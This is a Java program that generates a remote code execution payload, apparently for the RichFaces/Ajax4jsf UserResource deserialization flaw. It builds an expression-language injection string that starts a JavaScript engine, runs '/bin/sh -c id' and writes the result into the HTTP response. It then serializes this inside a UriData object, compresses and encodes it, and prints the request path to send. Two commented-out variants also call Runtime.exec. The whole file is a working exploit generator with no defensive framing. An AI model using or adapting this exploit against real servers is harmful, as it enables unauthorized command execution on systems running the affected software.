import com.sun.facelets.el.TagValueExpression;
import com.sun.facelets.tag.TagAttribute;
import com.sun.facelets.tag.Location;
import org.ajax4jsf.util.base64.URL64Codec;
import org.jboss.el.ValueExpressionImpl;
import org.ajax4jsf.resource.UserResource;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Date;
import java.util.zip.Deflater;
import javax.faces.context.FacesContext;

public class Main {
    public static void main(String[] args) throws Exception{
        //String pocEL = "${\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\"java.lang.Runtime.getRuntime().exec(\'id\')\")}";
        //String pocEL = "#{request.getClass().getClassLoader().loadClass(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"id\")}";
        String pocEL = 
        		"${FacesContext.getExternalContext().getResponse().setContentType(\"text/plain; charset=\\\"UTF-8\\\"\")}" +
        		"${session.setAttribute(\"scriptfactory\",\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance())}" + 
        		"${session.setAttribute(\"scriptengine\",session.getAttribute(\"scriptfactory\").getEngineByName(\"JavaScript\"))}" + 
        		"${session.getAttribute(\"scriptengine\").getContext().setWriter(facesContext.getExternalContext().getResponse().getWriter())}" + 
        		"${session.getAttribute(\"scriptengine\").eval(" + 
        		"\"var proc = new java.lang.ProcessBuilder[\\\"(java.lang.String[])\\\"]([\\\"/bin/sh\\\",\\\"-c\\\",\\\"\".concat(\"id\").concat(\"\\\"]).start();\n" + 
        		"var is = proc.getInputStream(); " + 
        		"var sc = new java.util.Scanner(is,\\\"UTF-8\\\"); var out = \\\"\\\"; " + 
        		"while (sc.hasNext()) " + 
        		"	{out += sc.nextLine()+String.fromCharCode(10);}\n" + 
        		"print(out);\"))}" + 
        		"${FacesContext.getExternalContext().getResponse().getWriter().flush()}${FacesContext.getExternalContext().getResponse().getWriter().close()}";
        Class<?> cls = Class.forName("javax.faces.component.StateHolderSaver");
        Constructor<?> ct = cls.getDeclaredConstructor(FacesContext.class, Object.class);
        ct.setAccessible(true);

        //Long MethodExpressionSerialVersionUID = 8163925562047324656L;
        Location location = new Location("", 0, 0);
        
        // UriData.value
        Object value = "";
        // UriData.createContent
        Object createContent = "";
        // UriData.expires
        Object expires = "";
        // UriData.modified
        TagAttribute tag = new TagAttribute(location, "", "", "", "");
        ValueExpressionImpl valueExpression = new ValueExpressionImpl(pocEL+" modified", null, null, null, Date.class);
        TagValueExpression tagValueExpression = new TagValueExpression(tag, valueExpression);
        Object modified = ct.newInstance(null, tagValueExpression);

        UserResource.UriData uriData = new UserResource.UriData();

        Field valueField = uriData.getClass().getDeclaredField("value");
        valueField.setAccessible(true);
        valueField.set(uriData, value);

        Field createContentField = uriData.getClass().getDeclaredField("createContent");
        createContentField.setAccessible(true);
        createContentField.set(uriData, createContent);

        Field expiresField = uriData.getClass().getDeclaredField("expires");
        expiresField.setAccessible(true);
        expiresField.set(uriData, expires);

        Field modifiedField = uriData.getClass().getDeclaredField("modified");
        modifiedField.setAccessible(true);
        modifiedField.set(uriData, modified);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(uriData);
        objectOutputStream.flush();
        objectOutputStream.close();
        byteArrayOutputStream.close();

        // zip+base64
        byte[] pocData = byteArrayOutputStream.toByteArray();
        Deflater compressor = new Deflater(1);
        byte[] compressed = new byte[pocData.length + 100];
        compressor.setInput(pocData);
        compressor.finish();
        int totalOut = compressor.deflate(compressed);
        byte[] zipsrc = new byte[totalOut];
        System.arraycopy(compressed, 0, zipsrc, 0, totalOut);
        compressor.end();
        byte[]dataArray = URL64Codec.encodeBase64(zipsrc);
        // print poc
        String poc = "/DATA/" + new String(dataArray);
        System.out.println(poc);
    }
}